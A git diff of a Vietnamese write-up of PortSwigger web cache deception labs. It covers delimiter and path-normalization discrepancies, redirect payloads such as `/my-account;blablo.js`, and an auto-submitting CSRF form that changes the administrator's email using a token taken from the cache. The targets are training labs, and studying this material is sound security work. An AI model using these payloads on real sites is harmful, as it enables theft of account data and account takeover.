@@ -13,33 +13,38 @@ To solve this lab, you'll need to know:
 - How to detect and exploit discrepancies in the way the cache and origin server map URL paths.
 
 **Thực hiện**
-dang nhap 
+Đăng nhập  
 ![alt text](image.png)
 
-thu thay doi
+Thử thay đổi  
 ![alt text](image-1.png)
 
-them tệp tĩnh để kích hoạt cơ chế lưu cache
+Thêm tệp tĩnh để kích hoạt cơ chế lưu cache  
 ![alt text](image-2.png)
-thu truy cap lai
+
+Thử truy cập lại  
 ![alt text](image-3.png)
+
 
 ```
 Cache-Control: max-age=30
 Age: 13
 X-Cache: hit
 ```
-=> Phát hiện được cơ chế lưu cache
+=> Nhận thấy có cơ chế lưu cache đang hoạt động.
 
-craft an exploit
+Tạo đoạn mã khai thác (exploit)  
 `<script>document.location="https://id.web-security-academy.net/my-account/tmp.js"</script>`
 
-store lại và gửi đến nạn nhân.
+Lưu lại và gửi tới nạn nhân.  
 ![alt text](image-4.png)
-Kiểm tra nạn nhân nhận được chưa ?
+
+Kiểm tra xem nạn nhân đã nhận được chưa  
 ![alt text](image-5.png)
-Thực hiện truy vấn tới cache trên burp `GET /my-account/tmp.js`
+
+Thực hiện truy vấn tới cache bằng Burp: `GET /my-account/tmp.js`  
 ![alt text](image-6.png)
+
 
 **Note**
 Dựa vào quan sát thời gian phản hồi mà ta có được những suy đoán về cơ chế lưu cache. Ở bài lab này các đường dẫn tới tệp tĩnh đưa server cache lưu lại (không phải cache trình duyệt). Song cơ chế chuẩn hóa đường dẫn của phía Server lại chuẩn hóa những đường dẫn sai đó về đường dẫn đúng. Sự không ăn khớp giữa 2 bên đã tạo ra lỗ hổng giúp kẻ tấn công truy xuất được thông tin nhạy cảm thông qua lỗ hổng CSRF.
@@ -52,27 +57,29 @@ To solve the lab, find the API key for the user `carlos`. You can log in to your
 We have provided a list of possible delimiter characters to help you solve the lab: Web cache deception lab delimiter list.
 
 **Thực hiện**
-quan sat goi tin
+Quan sát gói tin  
 ![alt text](image-7.png)
 
-Kiểm tra delimiters có thể được sử dụng để tạo lỗ hổng trong bài lab này.
+Kiểm tra các ký tự phân cách (delimiters) có thể được dùng để tạo lỗ hổng trong bài lab này  
 ![alt text](image-8.png)
-tắt url encode để được kết quả chính xác.
+
+Tắt URL encode để có kết quả chính xác hơn  
 ![alt text](image-9.png)
 
-Có thể hệ thống này sử JAVA SPRING BOOT. Thử nghiệm lưu lỗ hổng lưu cache.
+Có thể hệ thống đang sử dụng JAVA SPRING BOOT. Thử nghiệm lưu lỗ hổng vào cache  
 ![alt text](image-10.png)
 
-Craft payload tấn công:
+Tạo payload tấn công:  
 `<script>document.location="https://id.web-security-academy.net/my-account;blablo.js"</script>`
 
-Gui cho nan nhan va quan sat log.
+Gửi cho nạn nhân và quan sát log  
 ![alt text](image-11.png)
 
-Trich xuat thong tin qua `GET /my-account;blablo.js`
+Trích xuất thông tin qua truy vấn: `GET /my-account;blablo.js`  
 ![alt text](image-12.png)
 
-Nan nhan da an vao link -> Truy van de lay thong tin api
+Nạn nhân đã click vào link → Truy vấn để lấy thông tin API
+
 
 **Note**
 Mỗi frame work có cách xử lí các kí tự ngắt khác nhau ví dụ trong Java Spring Boot thì sử dụng `;` nhưng cache thì lại không hiểu kí tự này và dựa vào tập lưu nên lưu trữ và xử lí với các tệp tin.
@@ -90,24 +97,34 @@ Mỗi frame work có cách xử lí các kí tự ngắt khác nhau ví dụ tro
 To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.
 
 **Thực hiện**
-Viec dau tien la xac dinh lo hong.
-Dau tien xac dinh sự khác biệt của phân cách. Điều này làm như bài lab số 2.
-![alt text](image-14.png)
+Việc đầu tiên là xác định lỗ hổng.  
+Bắt đầu bằng cách xác định sự khác biệt khi sử dụng các ký tự phân cách trong URL.  
+Điều này tương tự với cách làm trong bài lab số 2.  
+![alt text](image-14.png)  
 ![alt text](image-15.png)
 
-Tiep theo quan sat goi tin va xac dinh co che chuan hoa duong dan cua server
+Tiếp theo, quan sát gói tin và xác định cơ chế chuẩn hóa đường dẫn (path normalization) trên server  
 ![alt text](image-13.png)
-De y cac goi tin tu duong dan `/resources` đểu được cache xử lí. Dấu hiệu là thông qua header `Cache-Control` và `Age` bên gói tin phản hồi. 
-Thay doi goi tin 
-![alt text](image-16.png)
-![alt text](image-17.png)
-Dieu nay chung to rang thong tin nay da duoc luu vao trong cache
 
-Tao payload
+Chú ý: Các gói tin có đường dẫn `/resources` đều được xử lý qua cơ chế cache.  
+Dấu hiệu nhận biết là qua các header trong phản hồi như:  
+- `Cache-Control`: chỉ ra thời gian lưu cache  
+- `Age`: cho biết nội dung đã được cache bao lâu  
+
+Thay đổi gói tin để thử nghiệm  
+![alt text](image-16.png)  
+![alt text](image-17.png)
+
+Điều này cho thấy rằng thông tin (response) đã được lưu vào cache thành công.
+
+Tạo payload để khai thác:  
 `<script>document.location="https://0a0c0065030081db8035128c001d00ca.web-security-academy.net/resources/..%2fmy-account"</script>`
 
+Gửi đến nạn nhân và kiểm tra lại  
 ![alt text](image-18.png)
-Nhu ta thay thi file da duoc luu vao trong cache.
+
+Như ta thấy, file đã được lưu vào cache thông qua payload, có thể dẫn đến việc thông tin bị tiết lộ khi nạn nhân truy cập.
+
 
 **Note**
 Ở bài lab này việc chuẩn hóa đường dẫn là chìa khóa để có thể khai thác. Một số Cache server không phân biệt được đường dẫn chưa chuẩn hóa hoặc chuẩn hóa chưa hoàn toàn thành đường dẫn đến file. Và lưu trữ nó, tuy nhiên phía bên server thì luôn có bước chuẩn hóa đường dẫn rồi mới truy cập. 
@@ -118,31 +135,42 @@ Nhu ta thay thi file da duoc luu vao trong cache.
 To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.
 
 **Thực hiện**
-Theo de bai thi bai nay web cache server se tu dong chuan hoa con phia server thi khong.
-Day la goi tin ban dau
-![alt text](image-19.png)
-Thay doi thanh `GET /resources/css/..%2fcss/labs.css`
-![alt text](image-20.png)
-Quay lai voi payload dau
-![alt text](image-21.png)
-=> Dieu nay chung to `/resources/css/..%2fcss/labs.css` duojc web cache hieu la `/resources/css/labs.css` va luu vao cache -> Do do khi truy van nhu ban dau thi lai tra ve nhu anh thu 3. va sau khi het tgian cache thi lai truy cap binh thuong
+Theo đề bài, web cache server sẽ tự động chuẩn hóa đường dẫn, trong khi phía server thì không.
 
-Trigger Cache. Cache luu thong tin o thu muc `resources`
+Đây là gói tin ban đầu  
+![alt text](image-19.png)
+
+Thay đổi truy vấn thành:  
+`GET /resources/css/..%2fcss/labs.css`  
+![alt text](image-20.png)
+
+Quay lại với payload ban đầu  
+![alt text](image-21.png)
+
+=> Điều này chứng tỏ rằng `/resources/css/..%2fcss/labs.css` đã được web cache hiểu là `/resources/css/labs.css` và lưu vào cache.  
+→ Do đó, khi truy vấn lại như ban đầu, server sẽ trả về nội dung đã được cache (như ảnh thứ 3).  
+→ Sau khi cache hết hạn, truy cập sẽ trở lại bình thường.
+
+*Kích hoạt cache (Trigger Cache)*
+Cache sẽ lưu thông tin tại thư mục `/resources`  
 ![alt text](image-22.png)
-Tim kiem delimiters phu hop de loi dung co che khac nhau giu server và web cache server
-![alt text](image-23.png)
+
+Tìm kiếm các ký tự phân cách (delimiters) phù hợp để khai thác sự khác biệt trong cách xử lý giữa web cache server và ứng dụng phía server  
+![alt text](image-23.png)  
 ![alt text](image-24.png)
 
-Thử với cả 4 trường hợp thì `%23` hiện thị lưu trữ cache
+Sau khi thử nghiệm với 4 trường hợp, nhận thấy rằng `%23` (ký tự `#` – ký hiệu bắt đầu fragment trong URL) là lựa chọn có hiệu quả khi lưu vào cache.  
 ![alt text](image-25.png)
 
-
-Craft a response.
+Tạo phản hồi độc hại (malicious response):  
 `<script>document.location="https://0aeb00220461826182354800004e00b0.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?vcl"</script>`
-Gửi cho nạn nhân và theo doi log
+
+Gửi payload cho nạn nhân và theo dõi log  
 ![alt text](image-26.png)
-Truy cap de lay thong tin của cache nan nhan
+
+Truy cập để lấy thông tin từ cache của nạn nhân  
 ![alt text](image-27.png)
+
 
 **Note**
 
@@ -153,23 +181,37 @@ Truy cap de lay thong tin của cache nan nhan
 To solve the lab, change the email address for the user `administrator`. You can log in to your own account using the following credentials: `wiener:peter`.
 
 **Thực hiện**
-Bai nay, cache chi luu cac file co dinh như `favicon.ico`. De trigger lo hong web cache. Truoc tien ta can Detecting Normalization By the Cache Server
-![alt text](image-28.png)
-![alt text](image-29.png)
-![alt text](image-30.png)
--> `abc%2f%2e%2e%2ffavicon.ico`. Server không chuẩn hóa còn Cache chuẩn hóa được.
--> Tức đã là phần url trên đã được lưu cache.
+Bài này, cache chỉ lưu các file tĩnh như `favicon.ico`.  
+→ Để khai thác được lỗ hổng Web Cache, trước tiên ta cần **phát hiện việc chuẩn hóa URL bởi cache server** (Detecting Normalization By the Cache Server)
 
-`GET my-account%2f%2e%2e%2ffavicon`. Tìm kiếm delimiter để có thể truy cập được `/my-account` nhưng cache server lại lưu vào cache. Kí tự delimiter phù hợp `;`
+![alt text](image-28.png)  
+![alt text](image-29.png)  
+![alt text](image-30.png)
+
+→ Truy vấn với URL: `abc%2f%2e%2e%2ffavicon.ico`  
+Kết quả:
+- Phía **server không chuẩn hóa** URL này
+- Nhưng **cache server đã chuẩn hóa** và hiểu đúng đường dẫn `/favicon.ico`  
+→ Điều này chứng tỏ nội dung tương ứng đã được lưu vào cache.
+
+Tiếp theo, thử truy vấn:  
+`GET my-account%2f%2e%2e%2ffavicon`  
+→ Mục tiêu: truy cập vào `/my-account` nhưng dưới dạng mà **server xử lý đúng**, còn **cache server thì lại lưu vào cache như là một file favicon**
+
+Tìm kiếm ký tự delimiter phù hợp → chọn được `;`  
 ![alt text](image-31.png)
 
-Tạo payload để lấy thông tin admin
+**Tạo payload để lấy thông tin admin:**  
 `<script>document.location="https://0a6400de030e97768593d28100420015.web-security-academy.net/my-account;%2f%2e%2e%2ffavicon.ico"</script>`
 
-Truoc khi cache het han ta lay duoc thong tin admin
+Gửi payload cho nạn nhân, và nếu truy cập đúng thời điểm **cache vẫn còn hiệu lực**, sẽ thu được thông tin admin  
 ![alt text](image-32.png)
 
-De thay đoi email cua nan nhan ta can ta 1 payload nhu sau
+---
+
+**Khai thác sâu hơn – thay đổi email nạn nhân**  
+Tạo một payload dạng HTML form giả mạo để tự động gửi yêu cầu thay đổi email:
+
 ```
 <form class="testForm" name="change-email-form" action="https://0aae002f0480e270c92ee04100ba0094.web-security-academy.net/my-account/change-email" method="POST">
     <input  type="email" name="email" value="hacker@gmail.com">
@@ -179,5 +221,7 @@ De thay đoi email cua nan nhan ta can ta 1 payload nhu sau
   document.querySelector('.testForm').submit();
 </script>
 ```
-luu y ma csrf ta lay duoc thong qua phan hoi cache duoc luu lai cua administrator
+Mã CSRF (csrf) ở trên được thu thập từ phần phản hồi đã bị lưu cache của `administrator`
+→ Đây chính là điểm mấu chốt cho phép tấn công CSRF thành công.
+
 **Note**
